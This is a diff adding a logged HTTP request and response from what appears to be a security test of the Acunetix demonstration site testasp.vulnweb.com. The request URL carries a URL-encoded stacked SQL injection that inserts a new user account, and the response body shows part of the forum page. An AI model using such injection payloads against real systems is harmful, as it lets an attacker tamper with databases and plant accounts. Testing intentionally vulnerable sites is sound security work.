@@ -1,0 +1,47 @@
+URL: http://testasp.vulnweb.com/showthread.asp?id=0%3BIF%20NOT%20EXISTS%28SELECT%201%20FROM%20users%20WHERE%20uname%3D%27acu-r7%20proof%27%29%20INSERT%20INTO%20users%20%28uname%2Cupass%2Cemail%2Crealname%2Cavatar%29%20VALUES%20%28%27acu-r7%20proof%27%2C%27P%40ss-r7%27%2C%27r7%40example.com%27%2C%27r7%27%2C%27%27%29--
+
+=== RESPONSE HEADERS ===
+HTTP/1.1 200 OK
+Cache-Control: private
+Content-Type: text/html
+Server: Microsoft-IIS/8.5
+Set-Cookie: ASPSESSIONIDCCCTQDSA=DHAMLFKAFOALKDFFOLBDADAH; path=/
+X-Powered-By: ASP.NET
+Date: Mon, 28 Sep 2026 06:02:16 GMT
+Content-Length: 8548
+
+
+
+=== BODY (first 3000) ===
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->
+<head>
+<!-- InstanceBeginEditable name="doctitle" -->
+<title>acuforum
+1
+</title>
+<!-- InstanceEndEditable -->
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->
+<link href="styles.css" rel="stylesheet" type="text/css">
+</head>
+<body> 
+<table width="100%"  border="0" cellpadding="10" cellspacing="0"> 
+  <tr bgcolor="#008F00"> 
+    <td width="306px"><a href="https://www.acunetix.com/"><img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></td> 
+    <td align="right" valign="middle" bgcolor="#008F00" class="disclaimer">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></td> 
+  </tr> 
+  <tr> 
+    <td colspan="2"><div class="menubar"><a href="Templatize.asp?item=html/about.html" class="menu">about</a> - <a href="Default.asp" class="menu">forums</a> - <a href="Search.asp" class="menu">search</a> 
+     - <a href="./Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0%253BIF%2520NOT%2520EXISTS%2528SELECT%25201%2520FROM%2520users%2520WHERE%2520uname%253D%2527acu%2Dr7%2520proof%2527%2529%2520INSERT%2520INTO%2520users%2520%2528uname%252Cupass%252Cemail%252Crealname%252Cavatar%2529%2520VALUES%2520%2528%2527acu%2Dr7%2520proof%2527%252C%2527P%2540ss%2Dr7%2527%252C%2527r7%2540example%2Ecom%2527%252C%2527r7%2527%252C%2527%2527%2529%2D%2D" class="menu">login</a> - <a href="./Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0%253BIF%2520NOT%2520EXISTS%2528SELECT%25201%2520FROM%2520users%2520WHERE%2520uname%253D%2527acu%2Dr7%2520proof%2527%2529%2520INSERT%2520INTO%2520users%2520%2528uname%252Cupass%252Cemail%252Crealname%252Cavatar%2529%2520VALUES%2520%2528%2527acu%2Dr7%2520proof%2527%252C%2527P%2540ss%2Dr7%2527%252C%2527r7%2540example%2Ecom%2527%252C%2527r7%2527%252C%2527%2527%2529%2D%2D" class="menu">register</a> 
+	- <a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu">SQL scanner</a> - <a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu">SQL vuln help</a>
+    </div></td> 
+  </tr> 
+  <tr> 
+    <td colspan="2"><!-- InstanceBeginEditable name="MainContentLeft" -->
+		<div class="path">
+			<a href="showforum.asp?id=0">Acunetix Web Vulnerability Scanner</a>/1
+		</div>
+      <table width="100%" cellspacing="1" cellpadding="5" bgcolor="#E5E5E5">
+        <tr><td valign='top' align='center' bgcolor='#FFFFFF' width='120'><img src='avatars/noavatar.gif'><br>posted by <b>admin</b> on 11/9/2005 12:16:25 PM</td><td valign='top' bgcolor='#FFFFFF'><div class='posttitle'>1</div><div class='posttext'>1</div></td></tr><tr><td valign='top' align='center' bgcolor='#FFFFFF' width='120'><img 
